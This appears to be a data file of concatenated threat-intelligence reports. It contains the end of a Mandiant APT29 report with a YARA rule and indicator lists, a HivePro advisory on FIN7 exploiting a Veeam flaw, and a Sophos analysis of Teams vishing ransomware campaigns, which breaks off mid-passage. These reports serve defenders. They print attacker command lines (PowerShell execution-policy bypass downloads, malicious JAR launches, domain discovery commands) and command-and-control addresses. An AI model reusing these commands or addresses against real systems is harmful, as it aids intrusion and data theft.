https://github.com/monoxgas/sRDI/blob/master/ShellcodeRDI"" disclaimer = ""This rule is meant for hunting and is not tested to run in a production environment."" strings: $ep = {E8 00 00 00 00 59 49 89 C8 BA [4] 49 81 c0 [4] 41 b9 [4] 56 48 89 e6 48 83 ?? f0 48 83 ec 30 48 89 4c 24 ?? 48 81 c1 [4] c7 44 24 ?? [4] e8} condition: $ep at 0 } Mandiant Security Validation Actions Mandiant Advantage Security Validation can automate the following process to give you real data on how your security controls are performing against these threats. The following table is a subset of MSV actions for one of the malware variants. Find out more about Mandiant Security Validation. VID Name S100- 192 Malicious Activity Scenario - APT29 Continues to Leverage Meeting Agenda Themes, ROOTSAW, SALTSHAKER to Target European Diplomatic Entities S100- 199 Malicious Activity Scenario - APT29 Uses BEATDROP and BOOMMIC to Deploy BEACON S100- 262 Malicious Activity Scenario - APT29 Targets with ROOTSAW, FANCYBEAT Downloaders, Variant #1 A106- 551 A106- 542 Phishing Email - Malicious Link, APT29, MUSKYBEAT, Variant #1 Command and Control - APT29, MUSKYBEAT , DNS Query 24/30 A106- 544 A106- 545 Malicious File Transfer - APT29, MUSKYBEAT Dropper, Download, Variant #1 Malicious File Transfer - APT29, MUSKYBEAT, Download, Variant #1 Indicators of Compromise March 2023: Earthquake-Themed Türkiye Campaign e-yazi.htm (MD5: a3067a0262e651e94329869f43a51722) ROOTSAW dropper Redirected from https://tinyurl[.]com/mrxcjsbs Downloaded from https://www.willyminiatures[.]com/e-yazi.htm/?v=bc78a8d162c6 Drops eeded26943a7b2fdef7608fb21bbfd66 Drops 4a13138e1f38b2817a63417d67038429 e-yazi.pdf (MD5: 4a13138e1f38b2817a63417d67038429) Decoy PDF e-yazi.iso (MD5: eeded26943a7b2fdef7608fb21bbfd66) ISO file containing next stages Drops 4b0921979d3054d9f0dad48e9560b9ca (BURNTBATTER) Drops 84b078d4a9e6e2a03e8ae1eca072dc83 (DONUT) e-yazi.html (MD5: b051e8efb40c2c435d77f3be77c59488) ROOTSAW dropper Downloaded from https://simplesalsamix[.]com/e-yazi.html Drops 854e5c592e93b69b8ab08dbc8a0b673f Drops f4ef5672af889429d95f111ea65ff490 e-yazi.pdf (MD5: f4ef5672af889429d95f111ea65ff490) Decoy PDF Dropped by 854e5c592e93b69b8ab08dbc8a0b673f Dropped by b051e8efb40c2c435d77f3be77c59488 (ROOTSAW) e-yazi.zip (MD5: 854e5c592e93b69b8ab08dbc8a0b673f) Zip file containing next stages Dropped by b051e8efb40c2c435d77f3be77c59488 (ROOTSAW) Drops 129da1e7c8613fd8c2843d9ec191e30e (BURNTBATTER) Drops aec65c1e6a6f9b3782174c192780f5b4 (DONUT) March 2023: European Diplomatic-Focused Phishing Campaigns Note.pdf (MD5: 1485b591e654327c1d032a901940b149) Lure PDF Contains link to https://parquesanrafael[.]cl/note.html note.html (MD5: 0d5b12c50173a176b0a8ba5a97a831d8) ROOTSAW dropper Downloaded from https://inovaoftalmologia[.]com[.]br/note.php?ip=<IP>&ua=<UA> Drops 22adbffd1dbf3e13d036f936049a2e98 25/30 note.html (MD5: 9e42b22d66f0fe0fae24af219773ac87) ROOTSAW dropper Downloaded from https://parquesanrafael[.]cl/note.html Drops 22adbffd1dbf3e13d036f936049a2e98 Note.iso (MD5: 22adbffd1dbf3e13d036f936049a2e98) Malicious ISO Dropped by 0d5b12c50173a176b0a8ba5a97a831d8 (ROOTSAW) Dropped by 9e42b22d66f0fe0fae24af219773ac87 (ROOTSAW) Drops db2d9d2704d320ecbd606a8720c22559 (MUSKYBEAT encrypted payload) Drops 166f7269c2a69d8d1294a753f9e53214 (MUSKYBEAT) April 2023: Old Wine in a New Bottle wine event.pdf (MD5: 62b2031f8988105efdf473bdfedd07f5) Malicious lure PDF file Downloads from https://sylvio[.]com[.]br/form.php note.zip (MD5: efe86302838ad2ab091540f4e0f7b75a) Zip file containing next stages NOTE____.EXE (MD5: b1820abc3a1ce2d32af04c18f9d2bfc3) Legitimate Windows Word software used for side loading Original name: winword.exe Compiled on: 2022/12/22 19:27:25 note/appvisvsubsystems64.dll (MD5: 9159d3c58c5d970ed25c2db9c9487d7a) MUSKYBEAT dropper Original name: hijacker.dll Compiled on: 2023/04/06 08:49:45 Dropped by efe86302838ad2ab091540f4e0f7b75a Drops bc4b0bd5da76b683cc28849b1eed504d (MUSKYBEAT) note/bdcmetadataresource.xsd (MD5: bc4b0bd5da76b683cc28849b1eed504d) Encrypted next stage Dropped by efe86302838ad2ab091540f4e0f7b75a Dropped by 9159d3c58c5d970ed25c2db9c9487d7a (MUSKYBEAT) Drops 0065cffe5a1c6a33900b781835aa9693 (DAVESHELL) Unknown (MD5: 0065cffe5a1c6a33900b781835aa9693) DAVESHELL dropper Dropped by bc4b0bd5da76b683cc28849b1eed504d (MUSKYBEAT) Drops 16d489cc5a91e7dbe74d1c9399534eac (MUSKYBEAT) runner.dll (MD5: 16d489cc5a91e7dbe74d1c9399534eac) MUSKYBEAT dropper Original name: runner.dll Compiled on: 2023/04/06 08:50:03 Dropped by 0065cffe5a1c6a33900b781835aa9693 (DAVESHELL) Drops c60aa80e0e58c2758f0bac037ec16dca (DONUT) Unknown (MD5: c60aa80e0e58c2758f0bac037ec16dca) DONUT in-memory dropper Dropped by 16d489cc5a91e7dbe74d1c9399534eac (MUSKYBEAT) Loads 1f21f9948b412f0198f928ed3266786b (STATICNOISE) 26/30 Unknown (MD5: 1f21f9948b412f0198f928ed3266786b) STATICNOISE downloader Compiled on: 2023/04/04 12:04:49 Dropped by c60aa80e0e58c2758f0bac037ec16dca Communicates with https://sharpledge[.]com/login.php May 2023: Ukraine Foreign Embassy-Focused Campaigns BMW 5 for sale in Kyiv - 2023.docx (MD5: 556857ccb27b527e05415eb6d443aee1) Hyperlink: https://t[.]ly/1IFg Redirects to: https://resetlocations[.]com/bmw.htm Unknown Document Hyperlink: https://tinyurl[.]com/ysvxa66c Redirects to https://resetlocations[.]com/bmw.htm bmw.htm (MD5: 880120da2f075155524430ceab7c058e) ROOTSAW dropper Drops e306333093eaf198f4d416d25a40784a bmw.iso (MD5: e306333093eaf198f4d416d25a40784a) Malicious ISO containing next stage payloads Dropped by 880120da2f075155524430ceab7c058e (ROOTSAW) Drops 0032b8eabdc41e01923fabca5fe8a06b (DONUT) bmw1.png (MD5: 4355851b6fcf2d44e3fd47f47a5e9502) Decoy image bmw1.png (MD5: 4355851b6fcf2d44e3fd47f47a5e9502) Decoy image bmw2.png (MD5: 5ff4831ee70c07e33c1bbe091840d5ee) Decoy image bmw3.png (MD5: 1ec49b2cb9d4ba265678359e117809b8) Decoy image bmw4.png (MD5: f089fd7204552aec41f64b1eb6b03eda) Decoy image bmw5.png (MD5: 0b0707ce90548f0c8b952138fff62742) Decoy image bmw6.png (MD5: 33312f16fd5b88470a0e7560954ae459) Decoy image bmw7.png (MD5: b382d0f8b130cd1804782d400a4d4f55) Decoy image bmw8.png (MD5: fc47284181f2bb6785e91c9b92710d78) Decoy image bmw9.png (MD5: b12a4b8ec485ad9f9c4cae1e25a35db8) Decoy image bmw1.png.lnk (MD5: 4c00d883444c78f19c3a1af191614491) Malicious LNK used to trigger next stage and load image bmw2.png.lnk (MD5: 68cc826c2c58cb74abe3e5ef2123102c) Malicious LNK used to trigger next stage and load image bmw3.png.lnk (MD5: 9685dae9ed8d2bf13b66593c1d7cd2eb) Malicious LNK used to trigger next stage and load image bmw4.png.lnk (MD5: dd2e5debb0ae8b8bccac5c1fbef6bb5a) Malicious LNK used to trigger next stage and load image 27/30 bmw5.png.lnk (MD5: 5bcf04c0fb0f62fc5f4b83789477a699) Malicious LNK used to trigger next stage and load image bmw6.png.lnk (MD5: 3f57258dce31ba0c80002130b8657b2b) Malicious LNK used to trigger next stage and load image bmw7.png.lnk (MD5: eccf100bc3d6e901f17a0eced5752ca7) Malicious LNK used to trigger next stage and load image bmw8.png.lnk (MD5: dbc9223af733d0140be136cf32a990d9) Malicious LNK used to trigger next stage and load image bmw9.png.lnk (MD5: ac78497929569682133e02dec9b67870) Malicious LNK used to trigger next stage and load image NOTE____.EXE (MD5: b1820abc3a1ce2d32af04c18f9d2bfc3) Legitimate Word application used for DLL side loading Original name: winword.exe Compiled on: 2022/12/22 19:27:25 Dropped by e306333093eaf198f4d416d25a40784a PDB path: D:\dbs\el\na1\Target\x64\ship\postc2r\x-none\winword.pdb AppvIsvSubsystems64.dll (MD5: 53270b3968004cb48dac1a1b239ed23d) BURNTBATTER in memory dropper Compiled on: 2023/05/03 13:27:37 Dropped by e306333093eaf198f4d416d25a40784a Loads 0032b8eabdc41e01923fabca5fe8a06b (DONUT) ojg2.px (MD5: 0032b8eabdc41e01923fabca5fe8a06b) Encrypted DONUT payload Loaded by 53270b3968004cb48dac1a1b239ed23d (BURNTBATTER) Dropped by e306333093eaf198f4d416d25a40784a Drops 6b41c60c24916e3c32acd90bbd7b92f9 (DONUT) Unknown (MD5: 6b41c60c24916e3c32acd90bbd7b92f9) DONUT dropper Dropped by 0032b8eabdc41e01923fabca5fe8a06b (DONUT) Drops 036ab9f19b63d44aaccf0f965df9434c (SPICYBEAT) Unknown (MD5: 036ab9f19b63d44aaccf0f965df9434c) SPICYBEAT downloader Client_id: 840aae0d-cd89-4869-bce1-94222c33035e Application Name: Teams_test Authentication URL: https://graph.microsoft[.]com/v1.0/me/drive/root:/Apps/Teams_test Invintation.zip (MD5:1aee5bf23edb7732fd0e6b2c61a959ce) Malicious ZIP containing next stage Downloaded from https://gavice[.]ng/event_program.php Drops 2d794d1544f933aacbd8da2dad78b381 Drops 5569fb4e9140974a80b4b7587b026913 (BURNTBATTER) Drops 1c0059d976795ceded7c1dd706e74bd1 Drops 595d8ea258ef8d8ec70b0e8a740e903c (DONUT) invitation_letter_and_programme_17.05.2023_en.pdf[spaces].exe/ invitation_letter_and_programme_17.05.2023_ua.pdf[spaces].exe (MD5:2d794d1544f933aacbd8da2dad78b381) Legitimate Adobe plugin Compiled on: 2022/04/07 05:19:03 Dropped by 1aee5bf23edb7732fd0e6b2c61a959ce Drops 1ed822cc08ba08413c4a60023e0d590c 28/30 icucnv22.dll (MD5:5569fb4e9140974a80b4b7587b026913) BURNTBATTER dropper Compiled on: 2023/05/13 10:04:14 Dropped by 1aee5bf23edb7732fd0e6b2c61a959ce Drops 595d8ea258ef8d8ec70b0e8a740e903c (DONUT) ly.ed (MD5:595d8ea258ef8d8ec70b0e8a740e903c) Encrypted DONUT Dropped by 5569fb4e9140974a80b4b7587b026913 (BURNTBATTER) Dropped by 1aee5bf23edb7732fd0e6b2c61a959ce Drops 1d54c487e6c8a08517fdb8efedfcd459 (DONUT) lu.ed.bin (MD5:1d54c487e6c8a08517fdb8efedfcd459) DONUT dropper Dropped by 595d8ea258ef8d8ec70b0e8a740e903c (DONUT) Drops 7a5988423f731d8b36d01926e715dd11 (SPICYBEAT) SPICYBEAT downloader (7a5988423f731d8b36d01926e715dd11) Compiled on: 2023/05/11 14:51:55 Dropped by 1d54c487e6c8a08517fdb8efedfcd459 (DONUT) Connects to https://graph.microsoft[.]com/v1.0/me/drives/442834D38635845C/root:/Apps/legron_application:/children Drops 41944bb155ecf70193245d8c3485dd2e (BEACON) Client_id: 5470384d-91c9-40f3-8891-8fb375c7df62 Application Name: legron_application Authentication URL: https://graph.microsoft[.]com/v1.0/me/drive/root:/Apps/ legron_application Unknown (MD5:41944bb155ecf70193245d8c3485dd2e) BEACON backdoor Downloaded from OneDrive Dropped by 7a5988423f731d8b36d01926e715dd11 (SPICYBEAT) Resolves zone kitaeri[.]com Connects to https://kitaeri[.]com/images Connects to https://kitaeri[.]com/gen_204 June 2023: Split ROOTSAW Campaign invitation.svg (MD5: 295527e2e38da97167979ade004de880) ROOTSAW dropper Attached to emails referencing “santa lucia celebration” Drops 800f766f728a4418b0c682a867673341 invitation.iso (MD5: 800f766f728a4418b0c682a867673341) ISO containing next stages Dropped by 295527e2e38da97167979ade004de880 Drops 5e1389b494edc86e17ff1783ed6b9d37 (STATICNOISE) Drops 9e51506816ad620c9e6474c52a9004a6 Drops 301a7273418bceaa3fb15b15f69dd32a Drops b48a16fdf890283cac7484ef0911a1f2 CCLEANER.dll (MD5: 5e1389b494edc86e17ff1783ed6b9d37) STATICNOISE downloader Side loaded by 301a7273418bceaa3fb15b15f69dd32a Downloads from https://kegas[.]id/search/s=1&id=APOX8NWOV4<userid> 29/30 INVITATI.LNK (MD5: 9e51506816ad620c9e6474c52a9004a6) LNK launcher Copies content of ISO to c:\Windows\Tasks and executes CCLeanerReactivator (301a7273418bceaa3fb15b15f69dd32a) CCleanerReactivator.EXE (MD5: 301a7273418bceaa3fb15b15f69dd32a) Legitimate CCleaner executable Side loads 5e1389b494edc86e17ff1783ed6b9d37 (STATICNOISE) July 2023: ICEBEAT Campaign Invitation_Farewell_DE_EMB.pdf (MD5: fc53c75289309ffb7f65a3513e7519eb) Malicious PDF document Drops 78062da99751c0a520ca4ac9fa59af73 (ROOTSAW) Invitation_Farewell_DE_EMB.html (MD5: 78062da99751c0a520ca4ac9fa59af73) ROOTSAW dropper Dropped by fc53c75289309ffb7f65a3513e7519eb (ROOTSAW) Connects to https://sgrhf[.]org.pk/wp-content/idx.php?n=ks&q= Drops d6986d991c41afcc2e71fc30bde851d1 invitation_farewell_de_emb.zip (MD5: d6986d991c41afcc2e71fc30bde851d1) Malicious ZIP containing HTA smuggler Dropped by 78062da99751c0a520ca4ac9fa59af73 (ROOTSAW) Drops d67f83dcda6d01bedf08a51df7415d14 invitation_farewell_de_emb.hta (MD5: d67f83dcda6d01bedf08a51df7415d14) Malicious HTML smuggler Dropped by d6986d991c41afcc2e71fc30bde851d1 Drops 0be11b4f34ede748892ea49e473d82db (ICEBEAT) Drops dfbdd308e22898f680b6c2c8eb052fb5 Drops 4f744666d2a2dc95419208c61e42f163 30/30"
G0046_fin7,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0046_fin7/FIN7-Affiliated-Hackers-Exploit-Flaws-in-Veeam-Backup-Servers_TA2023207.pdf,05579f08ffb3,G0046,"THREAT ADVISORY ATTACK REPORT Date of Publication May 2, 2023 Admiralty Code A3 TA Number TA2023207 Summary Attack began: March 28, 2023 Actor: FIN7 (aka ITG14, Gold Niagara, Calcium, Navigator, ATK 32, APT-C-11, TAG-CR1) Malware: POWERTRASH Loader & DICELOADER (also known as Lizar) Attack Region: Worldwide Attack: Publicly accessible servers using Veeam Backup & Replication (VBR) software were attacked, likely through a recently fixed vulnerability (CVE-2023-27532), by a group with similarities to the FIN7 activity group. Attack Regions CVEs CVE NAME AFFECTED PRODUCT ZERO- DAY CISA KEV PATCH CVE-2023- 27532 Veeam Missing Authentication for Critical Function Veeam Backup & Replication, Veeam Cloud Connect, Veeam Cloud Connect for the Enterprise & Veeam Backup & Replication Community Edition THREAT ADVISORY • ATTACK REPORT (Red) |2 Attack Details #1 #2 #3 Publicly accessible servers running Veeam Backup & Replication software have been targeted by intrusions. The attackers behind these incidents share characteristics with the FIN7 threat group. It is highly probable that the infiltration and execution of the attacks were made possible by initial exploiting a recently fixed vulnerability (CVE-2023-27532) in the Veeam Backup & Replication software. On March 28th, 2023, initial activity was detected on publicly accessible servers utilizing Veeam Backup & Replication (VBR) software, with approximately 7,500 VBR hosts still appearing vulnerable. A process associated with the Veeam Backup instance, known as ""sqlservr.exe,"" launched a shell command that facilitated the in-memory download and execution of an obfuscated PowerShell script called ""POWERTRASH."" This POWERTRASH Loader script is associated with the FIN7 activity group and has been utilized to deploy various payloads, such as Carbanak, DICELOADER, and Cobalt Strike. The payload used in the March attacks was DICELOADER, also known as Lizar, which is a backdoor attributed to FIN7. The infiltrators used DICELOADER as a foothold to gain access to the compromised machines and carry out post-exploitation procedures. Recommendations Ensure that TCP port 9401 is not exposed to the internet or is protected by a firewall that only permits access to trusted IP addresses. Regularly review and monitor network activity for any suspicious or unauthorized connections, especially over port 9401. Verify that all Veeam Backup & Replication software is up to date with the latest security patches to prevent exploitation of known vulnerabilities, such as CVE-2023-27532. Consider implementing multi-factor authentication or other access controls to restrict unauthorized access to the backup infrastructure hosts. Educate employees and staff on the importance of strong password management practices and regularly rotating and updating credentials to minimize the risk of unauthorized access. THREAT ADVISORY • ATTACK REPORT (Red) |3 Potential MITRE ATT&CK TTPs TA0043 Reconnaissance TA0001 Initial Access TA0002 Execution TA0003 Persistence TA0007 Discovery TA0008 Lateral Movement TA0011 Command and Control T1059 Command and Scripting Interpreter T1566 Phishing T1059.001 PowerShell T1071 Application Layer Protocol T1010 Application Window Discovery T1573 Encrypted Channel T1001 Data Obfuscation T1057 Process Discovery T1497 Virtualization/Sandbox Evasion T1047 Windows Management Instrumentation T1083 File and Directory Discovery Indicators of Compromise (IOCs) TYPE SHA1 IPV4 VALUE 8687b6b1508a93556d6e30d14e5c4ee9971f2d80 b621f8c5e9033718b4e9d47a2f0eccb9783f612a e5480a47172e3f75dbf0384f4ca82c7b47910e0f 217[.]12.206.176 162[.]248.225.115 45[.]136.199.128 91[.]149.243.181 91[.]199.147.152 95[.]217.49.123 77[.]75.230.112 194[.]87.148.41 195[.]123.244.162 THREAT ADVISORY • ATTACK REPORT (Red) |4 Patch Links https://www.veeam.com/kb4424 References https://labs.withsecure.com/publications/fin7-target-veeam-servers https://github.com/WithSecureLabs/iocs/blob/master/FIN7VEEAM/iocs.csv https://attack.mitre.org/groups/G0046/ https://github.com/horizon3ai/CVE-2023-27532 THREAT ADVISORY • ATTACK REPORT (Red) |5 What Next? At Hive Pro, it is our mission to detect the most likely threats to your organization and to help you prevent them from happening. Book a free demo with HivePro Uni5: Threat Exposure Management Platform. REPORT GENERATED ON May 2, 2023 • 5:55 AM © 2023 All Rights are Reserved by HivePro More at www.hivepro.com"
G0046_fin7,"/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0046_fin7/Sophos MDR tracks two ransomware campaigns using “email bombing,” Microsoft Teams “vishing”.pdf",e9d525912374,G0046,"Sophos MDR tracks two ransomware campaigns using “email bombing,” Microsoft Teams “vishing” news.sophos.com/en-us/2025/01/21/sophos-mdr-tracks-two-ransomware-campaigns-using-email-bombing-microsoft-teams-vishing/ January 21, 2025 Sophos X-Ops’ Managed Detection and Response (MDR) is actively responding to incidents tied to two separate groups of threat actors, each of which have used the functionality of Microsoft’s Office 365 platform to gain access to targeted organizations with the likely goal of stealing data and deploying ransomware. Sophos MDR began investigating these two separate clusters of activity in response to customer incidents in November and December 2024. Sophos is tracking these threats as STAC5143 and STAC5777. Both threat actors operated their own Microsoft Office 365 service tenants as part of their attacks and took advantage of a default Microsoft Teams configuration that permits users on external domains to initiate chats or meetings with internal users. STAC5777 overlaps with a threat group previously identified by Microsoft as Storm-1811. STAC5143 is a previously unreported threat cluster copying the Storm-1811 playbook, with possible connections to the threat actor known variously as FIN7, Sangria Tempest, or Carbon Spider. We are publishing this in-depth report on both threat clusters to aid defenders in detecting and blocking these continuing threats, and to raise awareness of the spread of these tactics among organizations using the Office 365 platform. Sophos MDR has observed more than 15 incidents involving these tactics in the past three months, with half of them in the past two weeks. Common tactics include: Email-bombing— targeted high volumes of spam email messages (as many as 3,000 in less than an hour) to overwhelm the Outlook mailboxes of a few individuals within the organization and create a sense of urgency Sending Teams messages and making Teams voice and video calls from an adversary-controlled Office 365 instance to targeted employees, posing as tech support for their organization Using Microsoft remote control tools—either Quick Assist or directly through Teams screen sharing—to take control of the targeted individual’s computer and install malware STAC5143: 1/8 Teams built-in remote control A Java Archive (JAR) and Java runtime that automate the exploitation of the victim’s computer JAR extracts Python-based backdoors from a .zip file downloaded from a remote SharePoint link. Uses techniques and tools connected to FIN7 STAC5777: Microsoft Quick Assist Hands-on-keyboard configuration changes and malware deployment Deployment of a legitimate Microsoft updater with a malicious side-loading DLL that provides persistence, steals credentials, and allows for discovery of network resources Uses RDP and Windows Remote Management to access other computers on the targeted network In one case, deployed Black Basta Ransomware Techniques, tools, and procedures overlap with Microsoft-identified threat actor Storm-1811 Highly active This report details the tactics of the two threat clusters, which both follow versions of the same attack pattern: email bombing and fake tech support social engineering with the delivery of malware, the exploitation of legitimate services through Microsoft’s Office 365 platform, and efforts to deploy command and control and data exfiltration tools. We believe with high confidence that both sets of adversarial activity are parts of ransomware and data theft extortion efforts. STAC5143 While some of the malware seen from this threat cluster in the two attacks Sophos observed were similar to attacks by FIN7 observed by eSentire and Sekoia , there were several things that diverged from the usual FIN7-type attack. FIN7 has been known to primarily target victims through phishing and (more recently) malicious sponsored Google Ads to deliver malware. This attack chain was different, and targeted organizations smaller and in different business sectors than FIN7’s usual victims. Attack chain Initial access In early November, an employee at a Sophos MDR customer organization reported to her internal IT contact that they had received an exceptionally large volume of spam messages—over 3,000 in a 45-minute period. Shortly after that, they received a Teams call from outside their organization, from an account named “Help Desk Manager.” As the organization used a managed service provider for IT services, this did not set off red flags with the employee who accepted the video call. During the call, the threat actor instructed the employee to allow a remote screen control session through Teams. Through this remote-control session that the attacker was able to open a command shell and drop files and execute malware, deploying them from an external SharePoint file store. The files included Java archive (JAR) files and a .zip archive containing Python code and other components. First Stage Execution The threat actor executed the JAR file from a command shell opened during the remote session with a copy of the legitimate javaw.exe, a Java “headless” runtime that interprets and executes Java code with no console output. Process Command Line cmd.exe “C:\Windows\system32\cmd.exe” RESULT / MITRE ATT&CK TTP ► javaw.exe C:\Users\Public\Documents\MailQueue-Handler\jdk-23.0.1\bin\javaw.exe -jar C:\Users\Public\Documents\MailQueue-Handler\MailQueue-Handler.jar TA0011: Command and Control – T1090: Proxy Via the Java-based proxy in MailQueue-Handler.jar, the attacker identified the process ID for javaw.exe using the Windows Management Instrumentation command line utility (WMIC.exe). The attacker then changed the code page for the active console window to “65001” to allow UTF-8 encoding for multilingual input and output support. This was likely used along with PowerShell execution policy bypass to allow encoded commands to be executed and evade AMSI detection. Process Command Line RESULT/ MITRE ATT&CK TTP ►► WMIC.exe ►► WMIC.exe wmic process where “name=’java.exe'” wmic process where “name=’javaw.exe'” Returns the ID for any running process of the Java runtime Returns the ID for any running process of the headless Java runtime 2/8 ►► cmd.exe cmd.exe /c chcp 65001 > NUL & powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile -Command – TA0002: Execution- T1059.001: PowerShell ►►► chcp.com chcp 65001 UTF-8 encoding on ►►► powershell.exe powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile -Command – The Java code then ran a series of PowerShell commands that downloaded a 7zip archive and the 7zip archiving utility. The utility was then used to extract the archive’s contents— a ProtonVPN executable and a malicious DLL (nethost.dll) side-loaded by the Proton executable. Process Command Line ►►► powershell.exe powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile - Command – MITRE ATT&CK TTP Downloads na.7z, a 7zip archive ►►► powershell.exe powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile - Command – Downloads 7za.dll, a 7zip utility dynamic link library ►►► powershell.exe powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile - Command – Downloads 7za.exe, the 7zip utility executable Discovery The attacker then obtained the target’s username using whoami.exe, and discovered network resources the user has access to via the net user command. Process Command Line MITRE ATT&CK TTP ►►►► whoami.exe “C:\Windows\system32\whoami.exe” ►►►► net.exe “C:\Windows\system32\net.exe” user [username] /domain TA0002: Execution – T1059.001: PowerShell TA0007: Discovery – T1049: System Network Connections Discovery ►►►►► net1.exe C:\Windows\system32\net1 user [username] /domain Sideload / Command and Control The Java code then launched the ProtonVPN executable to side-load nethost.dll, which created sessions connecting to virtual private servers hosted in Russia, Netherlands and the US. This behavior triggered Sophos endpoint protection behavioral detections for an unsigned DLL sideload. Process Command Line RESULT/ MITRE ATT&CK TTP ►►►► ProtonVPN.exe “C:\users\public\downloads\ProtonVPN.exe” Connects to 207.90.238[.]99 TA0002: Execution – T1059.001: PowerShell TA0011: Command and Control – T1071.001: Web Protocols TA0011: Command and Control – T1105: Ingress Tool Transfer ►►►► ProtonVPN.exe “C:\users\public\downloads\ProtonVPN.exe” Connects to 206.206.123.75 TA0002: Execution – T1059.001: PowerShell TA0011: Command and Control – T1071.001: Web Protocols TA0011: Command and Control – T1105: Ingress Tool Transfer ►►►► ProtonVPN.exe “C:\users\public\downloads\ProtonVPN.exe” Connects to 109.107.170[.]2 TA0002: Execution – T1059.001: PowerShell TA0011: Command and Control – T1071.001: Web Protocols TA0011: Command and Control – T1105: Ingress Tool Transfer ►►►► ProtonVPN.exe “C:\users\public\downloads\ProtonVPN.exe” Connects to 195.133.1[.]117 TA0002: Execution – T1059.001: PowerShell TA0011: Command and Control – T1071.001: Web Protocols TA0011: Command and Control – T1105: Ingress Tool Transfer The code from the JAR next opens another cmd.exe session, again configuring it for UTF-8, and executes a second Java .jar file (identity.jar) with javaw.exe , passing the target user’s username and Active Directory domain as parameters to the second-stage Java code. 3/8 Process Command Line RESULT/ MITRE ATT&CK TTP ►► cmd.exe cmd.exe /c chcp 65001 > NUL & powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile - Command – ►►► chcp.com ►►► powershell.exe ►►►► whoami.exe ►►►► whoami.exe chcp 65001 powershell.exe -ExecutionPolicy Bypass -NoExit -NoProfile -Command – “C:\Windows\system32\whoami.exe” “C:\Windows\system32\whoami.exe” ►►►► javaw.exe “C:\Users\Public\Documents\MailQueue-Handler\jdk-23.0.1\bin\javaw.exe” -jar C:\Users\Public\Documents\MailQueue-Handler\identity.jar [domain]\[username] An hour later, the tar.exe archive utility was used by the second-stage Java payload to extract files from the dropped file winter.zip to C:\ProgramData\. This was the Python malware payload being deployed. In addition, a series of commands were run to perform local user and network discovery—obtaining the name of network domain servers and their IP address. Process Command Line RESULT/ MITRE ATT&CK TTP ►►►► tar.exe “C:\Windows\system32\tar.exe” -xf C:\ProgramData\winter.zip -C :\ProgramData\ Extracts Python payload and supporting files ►►►► net.exe “C:\Windows\system32\net.exe” time C:\Windows\system32\net1 time Displays the time and date on the target device ►►►►► net1.exe ►►►► nltest.exe ►►►► nltest.exe “C:\Windows\system32\nltest.exe” /dclist:[domain].local “C:\Windows\system32\nltest.exe” /dclist:[domain].local ►►►► PING.EXE “C:\Windows\system32\PING.EXE” [domain controller hostname]. [domain].local ►►►► PING.EXE “C:\Windows\system32\PING.EXE” [domain controller hostname]. [domain].local ►►►► ipconfig.exe “C:\Windows\system32\ipconfig.exe” /all Returns a list of domain controllers TA0007: Discovery – T1018: Remote System Discovery TA0007: Discovery – T1482: Domain Trust Discovery TA0007: Discovery – T1018: Remote System Discovery TA0007: Discovery – T1482: Domain Trust Discovery Getting IP address of domain controller TA0007: Discovery – T1018: Remote System Discovery Getting IP address of second domain controller TA0007: Discovery – T1018: Remote System Discovery Getting local network configuration information TA0007: Discovery – T1018: Remote System Discovery Finally, the Java second stage code executed the malicious Python payload, using a Python interpreter included in the dropped files renamed to debug.exe. The Python scripts launched were a set of backdoors. Process Command Line RESULT/ MITRE ATT&CK TTP ►►►► debug.exe “C:\ProgramData\winter\debug.exe” C:\ProgramData\winter\45_237_80.py TA0002: Execution – sT1059.001: PowerShell TA0011: Command and Control – T1071.001: Web Protocols TA0011: Command and Control – T1105: Ingress Tool Transfer Malware analysis 4/8 Figure 1: A screenshot of Python code from an obfuscated copy of RPivot in the winter.zip archive deployed by the STAC5143 attackers. The Python code in the winter.zip payload used a lambda function (a short, anonymous throwaway function used in line with code) to obfuscate the rest of its script. That obfuscating lambda function matched those previously seen in FIN7-related Python malware loaders. Two of the Python components (166_65.py and 45_237_80.py ) were copies of a publicly-available reverse SOCKS proxy called RPivot. Designed as a legitimate too for use by penetration testers, RPivot Each of these Python scripts used different IP addresses for their remote . These backdoors received commands from the remote connection over port 80. Another script (37_44.py) was an RPivot script used to connect to a Tor relay. Attribution Sophos assesses with medium confidence that the Python malware used in this attack is connected to the threat actors behind FIN7/Sangria Tempest. The obfuscation method is identical to previous and FIN7 has been known to use the RPivot tool in attacks. However, we note that the obfuscation methods used are based on publicly available code, RPivot is also publicly available, and FIN7 has previously sold its tools to other cybercriminals. STAC5777 As with STAC5143, a few individuals at targeted organizations have been bombarded with a massive amount of spam emails, followed by an inbound Microsoft Teams message from someone claiming to be with their internal IT team. The Teams message—from the adversaries responsible for the spam messages— requested a Teams call to resolve the spam issues. But unlike the STAC5143 incidents we’ve observed, STAC5777 activity relied much more on “hands-on-keyboard” actions and scripted commands launched by the threat actors directly than STAC5143. Initial access In each of the incidents Sophos MDR documented, the adversary walked the user through the process of installing Microsoft Quick Assist over the Teams call. This was used to establish a remote session that gave the threat actor control over the targeted individual’s device. One of the customer estates had Sophos Office 365 integration configured, which allowed MDR to confirm the actor used an Office365 account ‘helpdesk@llladminhlpll.onmicrosoft.com’ from the IP address 78.46.67[.]201 to initiate these messages. Figure 2:Sophos Central investigation screen of threat actor’s incoming activity captured by Microsoft Office 365 integration 5/8 The threat actor walked the user through installing and executing the Microsoft remote access tool Quick Assist. The user was told to search for the application on the web, download it from the legitimate Microsoft website, and then launch it. They were then guided through granting the threat actor access to control the device remotely. Figure 3: Microsoft Teams activity initiated by threat actor controlling an external M365 tenant Once in control of the device the actor leveraged a web browser to download the malicious payload. In one case, the payload was downloaded directly from the threat actor-controlled host. In the others, it was split into two payloads: kb641812-filter-pack-2024-1.dat and kb641812-filter- pack-2024-2.dat, subdomains of blob.core.windows[.]net (hosts associated with Microsoft Azure file storage services). They then combined the two .dat files into a named pack.zip and then decompressed that archive using the tar.exe archive utility. This resulted in the creation of another archive file in the users’ AppData directory at OneDriveUpdate\upd2836a.bkt The threat actor then decompressed that file with writing files into the same \OneDriveUpdate folder: The legitimate, Microsoft-signed executable OneDriveStandaloneUpdater.exe Unsigned DLLs from the OpenSSL Toolkit (libcrypto-3-x64.dll and libssl-3-x64.dll), loaded by the 